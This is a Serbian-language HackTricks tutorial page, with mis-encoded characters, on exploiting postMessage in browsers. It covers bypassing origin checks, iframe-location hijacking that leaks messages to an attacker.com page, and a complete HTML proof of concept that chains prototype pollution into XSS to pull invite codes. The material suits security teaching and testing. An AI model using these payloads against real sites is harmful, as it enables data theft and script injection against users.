# PostMessage ranjivosti

## PostMessage ranjivosti

<details>

<summary><strong>NauÄite hakovanje AWS-a od nule do heroja sa</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Drugi naÄini podrÅ¡ke HackTricks-u:

* Ako Å¾elite da vidite **vaÅ¡u kompaniju reklamiranu na HackTricks-u** ili **preuzmete HackTricks u PDF formatu** proverite [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
* Nabavite [**zvaniÄni PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Otkrijte [**The PEASS Family**](https://opensea.io/collection/the-peass-family), naÅ¡u kolekciju ekskluzivnih [**NFT-ova**](https://opensea.io/collection/the-peass-family)
* **PridruÅ¾ite se** ğŸ’¬ [**Discord grupi**](https://discord.gg/hRep4RUj7f) ili [**telegram grupi**](https://t.me/peass) ili nas **pratite** na **Twitter-u** ğŸ¦ [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Podelite svoje hakovanje trikove slanjem PR-ova na** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repozitorijume.

</details>

## PoÅ¡alji **PostMessage**

**PostMessage** koristi sledeÄ‡u funkciju za slanje poruke:
```bash
targetWindow.postMessage(message, targetOrigin, [transfer]);

# postMessage to current page
window.postMessage('{"__proto__":{"isAdmin":True}}', '*')

# postMessage to an iframe with id "idframe"
<iframe id="idframe" src="http://victim.com/"></iframe>
document.getElementById('idframe').contentWindow.postMessage('{"__proto__":{"isAdmin":True}}', '*')

# postMessage to an iframe via onload
<iframe src="https://victim.com/" onload="this.contentWindow.postMessage('<script>print()</script>','*')">

# postMessage to popup
win = open('URL', 'hack', 'width=800,height=300,top=500');
win.postMessage('{"__proto__":{"isAdmin":True}}', '*')

# postMessage to an URL
window.postMessage('{"__proto__":{"isAdmin":True}}', 'https://company.com')

# postMessage to iframe inside popup
win = open('URL-with-iframe-inside', 'hack', 'width=800,height=300,top=500');
## loop until win.length == 1 (until the iframe is loaded)
win[0].postMessage('{"__proto__":{"isAdmin":True}}', '*')
```
Napomena da **targetOrigin** moÅ¾e biti '\*' ili URL kao Å¡to je _https://company.com._\
U **drugom scenariju**, **poruka se moÅ¾e poslati samo na tu domenu** (Äak i ako je poreklo objekta prozora drugaÄije).\
Ako se koristi **zvezdica**, **poruke mogu biti poslate na bilo koju domenu**, i biÄ‡e poslate na poreklo objekta prozora.

### Napad na iframe i zvezdicu u **targetOrigin**

Kao Å¡to je objaÅ¡njeno u [**ovom izveÅ¡taju**](https://blog.geekycat.in/google-vrp-hijacking-your-screenshots/), ako pronaÄ‘ete stranicu koja moÅ¾e biti **iframed** (bez zaÅ¡tite `X-Frame-Header`) i koja Å¡alje **osetljive** poruke putem **postMessage** koristeÄ‡i **zvezdicu** (\*), moÅ¾ete **izmeniti** **poreklo** **iframe-a** i **procuriti** **osetljivu** poruku na domen koji kontroliÅ¡ete.\
Napomena da ako se stranica moÅ¾e iframovati, ali je **targetOrigin postavljen na URL, a ne na zvezdicu**, ovaj **tri**k neÄ‡e funkcionisati.
```markup
<html>
<iframe src="https://docs.google.com/document/ID" />
<script>
setTimeout(exp, 6000); //Wait 6s

//Try to change the origin of the iframe each 100ms
function exp(){
setInterval(function(){
window.frames[0].frame[0][2].location="https://attacker.com/exploit.html";
}, 100);
}
</script>
```
## IskoriÅ¡Ä‡avanje funkcije addEventListener

**`addEventListener`** je funkcija koju JS koristi za deklarisanje funkcije koja oÄekuje **`postMessages`**.\
KoristiÄ‡e se sliÄan kod kao Å¡to je prikazan ispod:
```javascript
window.addEventListener("message", (event) => {
if (event.origin !== "http://example.org:8080")
return;

// ...
}, false);
```
U ovom sluÄaju, **prva stvar** koju kod radi je **provera porekla**. Ovo je izuzetno **vaÅ¾no**, posebno ako stranica treba da izvrÅ¡i **neÅ¡to osetljivo** sa primljenim informacijama (kao Å¡to je promena lozinke). **Ako ne proverava poreklo, napadaÄi mogu naterati Å¾rtve da Å¡alju proizvoljne podatke na ove endpointe** i promeniti lozinke Å¾rtava (u ovom primeru).

### Enumeracija

Da biste **pronaÅ¡li sluÅ¡aÄe dogaÄ‘aja** na trenutnoj stranici, moÅ¾ete:

* **PretraÅ¾ite** JS kod za `window.addEventListener` i `$(window).on` (_JQuery verzija_)
* **IzvrÅ¡ite** u konzoli alata za razvoj: `getEventListeners(window)`

![](<../../.gitbook/assets/image (618) (1) (1).png>)

* **Idite na** _Elements --> Event Listeners_ u alatima za razvoj pregledaÄa

![](<../../.gitbook/assets/image (617).png>)

* Koristite **dodatak za pregledaÄ** kao Å¡to je [**https://github.com/benso-io/posta**](https://github.com/benso-io/posta) ili [https://github.com/fransr/postMessage-tracker](https://github.com/fransr/postMessage-tracker). Ovi dodaci za pregledaÄ Ä‡e **presresti sve poruke** i prikazati ih vama.

### Bypass provere porekla

- Atribut **`event.isTrusted`** se smatra sigurnim jer vraÄ‡a `True` samo za dogaÄ‘aje koji su generisani od strane stvarnih korisniÄkih akcija. Iako je izazovno zaobiÄ‡i ga ako je pravilno implementiran, njegov znaÄaj u sigurnosnim proverama je primetan.

- Upotreba **`indexOf()`** za proveru porekla u PostMessage dogaÄ‘ajima moÅ¾e biti podloÅ¾na zaobilaÅ¾enju. Primer koji ilustruje ovu ranjivost je:

```javascript
("https://app-sj17.marketo.com").indexOf("https://app-sj17.ma")
```

- Metoda **`search()`** iz `String.prototype.search()` je namenjena za regularne izraze, a ne za stringove. ProsleÄ‘ivanje bilo Äega osim regularnog izraza dovodi do implicitne konverzije u regex, Äime se metoda potencijalno Äini nesigurnom. To je zato Å¡to u regex-u taÄka (.) deluje kao dÅ¾oker, omoguÄ‡avajuÄ‡i zaobilaÅ¾enje provere sa posebno oblikovanim domenima. Na primer:

```javascript
"https://www.safedomain.com".search("www.s.fedomain.com")
```

- Funkcija **`match()`**, sliÄno kao `search()`, obraÄ‘uje regex. Ako je regex nepravilno struktuiran, moÅ¾e biti podloÅ¾an zaobilaÅ¾enju.

- Funkcija **`escapeHtml`** je namenjena za sanitizaciju unosa putem izbegavanja karaktera. MeÄ‘utim, ona ne stvara novi objekat sa izbegnutim karakterima, veÄ‡ prebrisuje postojeÄ‡e osobine objekta. Ovo ponaÅ¡anje moÅ¾e biti iskoriÅ¡Ä‡eno. Konkretno, ako se objekat moÅ¾e manipulisati tako da njegova kontrolisana osobina ne priznaje `hasOwnProperty`, `escapeHtml` neÄ‡e raditi kako se oÄekuje. Ovo je prikazano u sledeÄ‡im primerima:

- OÄekivani neuspeh:
```javascript
result = u({
message: "'\"<b>\\"
});
result.message // "&#39;&quot;&lt;b&gt;\"
```

- ZaobilaÅ¾enje izbegavanja:
```javascript
result = u(new Error("'\"<b>\\"));
result.message; // "'"<b>\"
```

U kontekstu ove ranjivosti, objekat `File` je posebno podloÅ¾an iskoriÅ¡Ä‡avanju zbog svoje samo-ÄitajuÄ‡e osobine `name`. Ova osobina, kada se koristi u Å¡ablonima, nije sanitizovana funkcijom `escapeHtml`, Å¡to moÅ¾e dovesti do potencijalnih sigurnosnih rizika.

- Svojstvo `document.domain` u JavaScript-u moÅ¾e biti postavljeno od strane skripte kako bi se skratila domena, Å¡to omoguÄ‡ava opuÅ¡teniju primenu politike istog porekla unutar iste nadreÄ‘ene domene.

### Bypass e.origin == window.origin

Prilikom ugraÄ‘ivanja veb stranice unutar **sandbox iframe-a** koristeÄ‡i %%%<iframe sandbox="allow-scripts" src="https://example.com/iframe.php">%%%, vaÅ¾no je razumeti da Ä‡e poreklo iframe-a biti postavljeno na `null`. Ovo je posebno vaÅ¾no kada se radi sa **sandbox atributima** i njihovim implikacijama na sigurnost i funkcionalnost.

NavoÄ‘enjem **`allow-popups`** u sandbox atributu, svaki popup prozor otvoren iz iframe-a nasleÄ‘uje sandbox ograniÄenja svojih roditelja. To znaÄi da osim ako se takoÄ‘e ne ukljuÄi atribut **`allow-popups-to-escape-sandbox`**, poreklo popup prozora takoÄ‘e biva postavljeno na `null`, usklaÄ‘ujuÄ‡i se sa poreklom iframe-a.

Kao rezultat toga, kada se otvori popup u ovim uslovima i poruka se poÅ¡alje iz iframe-a u popup koristeÄ‡i **`postMessage`**, i poÅ¡iljalac i primalac imaju postavljeno poreklo na `null`. Ova situacija dovodi do scenarija u kojem se **`e.origin == window.origin`** procenjuje kao taÄno (`null == null`), jer i iframe i popup dele istu vrednost porekla `null`.

Za viÅ¡e informacija **proÄitajte**:

{% content-ref url="bypassing-sop-with-iframes-1.md" %}
[bypassing-sop-with-iframes-1.md](bypassing-sop-with-iframes-1.md)
{% endcontent-ref %}

### ZaobilaÅ¾enje e.source

MoguÄ‡e je proveriti da li je poruka poslata sa istog prozora u kojem skripta sluÅ¡a (posebno zanimljivo za **Content Scripts iz pregledaÄkih dodataka** kako bi se proverilo da li je poruka poslata sa iste stranice):
```javascript
// If itâ€™s not, return immediately.
if( received_message.source !== window ) {
return;
}
```
MoÅ¾ete prisiliti **`e.source`** poruke da bude null tako Å¡to Ä‡ete kreirati **iframe** koji **Å¡alje** **postMessage** i odmah se **briÅ¡e**.

Za viÅ¡e informacija **proÄitajte:**

{% content-ref url="bypassing-sop-with-iframes-2.md" %}
[bypassing-sop-with-iframes-2.md](bypassing-sop-with-iframes-2.md)
{% endcontent-ref %}

### Bypassovanje X-Frame-Header-a

Da biste izveli ove napade, idealno bi bilo da **ubacite veb stranicu Å¾rtve** unutar `iframe`-a. MeÄ‘utim, neki zaglavlji poput `X-Frame-Header` mogu **spreÄiti** takvo **ponaÅ¡anje**.\
U tim scenarijima i dalje moÅ¾ete koristiti manje prikriven napad. MoÅ¾ete otvoriti novi tab ka ranjivoj veb aplikaciji i komunicirati s njom:
```markup
<script>
var w=window.open("<url>")
setTimeout(function(){w.postMessage('text here','*');}, 2000);
</script>
```
### KraÄ‘a poruke poslate detetu blokiranjem glavne stranice

Na sledeÄ‡oj stranici moÅ¾ete videti kako moÅ¾ete ukrasti **osetljive podatke poslate putem postmessage** do deteta u iframe-u **blokiranjem** glavne stranice pre slanja podataka i zloupotrebom **XSS-a u detetu** da bi **procurili podaci** pre nego Å¡to budu primljeni:

{% content-ref url="blocking-main-page-to-steal-postmessage.md" %}
[blocking-main-page-to-steal-postmessage.md](blocking-main-page-to-steal-postmessage.md)
{% endcontent-ref %}

### KraÄ‘a poruke modifikovanjem lokacije iframe-a

Ako moÅ¾ete da ukljuÄite veb stranicu u iframe bez X-Frame-Header-a koja sadrÅ¾i drugi iframe, moÅ¾ete **promeniti lokaciju tog detetovog iframe-a**, tako da ako prima **postmessage** poslat koristeÄ‡i **zvezdicu**, napadaÄ moÅ¾e **promeniti** poreklo tog iframe-a na stranicu **kojom on upravlja** i **ukrasti** poruku:

{% content-ref url="steal-postmessage-modifying-iframe-location.md" %}
[steal-postmessage-modifying-iframe-location.md](steal-postmessage-modifying-iframe-location.md)
{% endcontent-ref %}

### postMessage do Prototype Pollution i/ili XSS

U scenarijima gde se podaci poslati putem `postMessage` izvrÅ¡avaju pomoÄ‡u JS-a, moÅ¾ete **ubaciti** stranicu u **iframe** i **iskoristiti** **prototype pollution/XSS** slanjem eksploatacije putem `postMessage`.

Par **veoma dobro objaÅ¡njenih XSS-a putem `postMessage`** moÅ¾e se naÄ‡i na [https://jlajara.gitlab.io/web/2020/07/17/Dom\_XSS\_PostMessage\_2.html](https://jlajara.gitlab.io/web/2020/07/17/Dom\_XSS\_PostMessage\_2.html)

Primer eksploatacije za zloupotrebu **Prototype Pollution, a zatim XSS-a** putem `postMessage` do `iframe-a`:
```html
<html>
<body>
<iframe id="idframe" src="http://127.0.0.1:21501/snippets/demo-3/embed"></iframe>
<script>
function get_code() {
document.getElementById('iframe_victim').contentWindow.postMessage('{"__proto__":{"editedbymod":{"username":"<img src=x onerror=\\\"fetch(\'http://127.0.0.1:21501/api/invitecodes\', {credentials: \'same-origin\'}).then(response => response.json()).then(data => {alert(data[\'result\'][0][\'code\']);})\\\" />"}}}','*');
document.getElementById('iframe_victim').contentWindow.postMessage(JSON.stringify("refresh"), '*');
}

setTimeout(get_code, 2000);
</script>
</body>
</html>
```
Za **viÅ¡e informacija**:

* Link do stranice o [**zagaÄ‘enju prototipa**](../deserialization/nodejs-proto-prototype-pollution/)
* Link do stranice o [**XSS**](../xss-cross-site-scripting/)
* Link do stranice o [**zagaÄ‘enju prototipa na klijentskoj strani do XSS-a**](../deserialization/nodejs-proto-prototype-pollution/#client-side-prototype-pollution-to-xss)

## Reference

* [https://jlajara.gitlab.io/web/2020/07/17/Dom\_XSS\_PostMessage\_2.html](https://jlajara.gitlab.io/web/2020/07/17/Dom\_XSS\_PostMessage\_2.html)
* [https://dev.to/karanbamal/how-to-spot-and-exploit-postmessage-vulnerablities-36cd](https://dev.to/karanbamal/how-to-spot-and-exploit-postmessage-vulnerablities-36cd)
* Za veÅ¾banje: [https://github.com/yavolo/eventlistener-xss-recon](https://github.com/yavolo/eventlistener-xss-recon)

<details>

<summary><strong>NauÄite hakovanje AWS-a od nule do heroja sa</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Drugi naÄini podrÅ¡ke HackTricks-u:

* Ako Å¾elite da vidite **vaÅ¡u kompaniju oglaÅ¡enu na HackTricks-u** ili **preuzmete HackTricks u PDF formatu** proverite [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
* Nabavite [**zvaniÄni PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Otkrijte [**The PEASS Family**](https://opensea.io/collection/the-peass-family), naÅ¡u kolekciju ekskluzivnih [**NFT-ova**](https://opensea.io/collection/the-peass-family)
* **PridruÅ¾ite se** ğŸ’¬ [**Discord grupi**](https://discord.gg/hRep4RUj7f) ili [**telegram grupi**](https://t.me/peass) ili nas **pratite** na **Twitter-u** ğŸ¦ [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Podelite svoje hakovanje trikove slanjem PR-ova na** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repozitorijume.

</details>
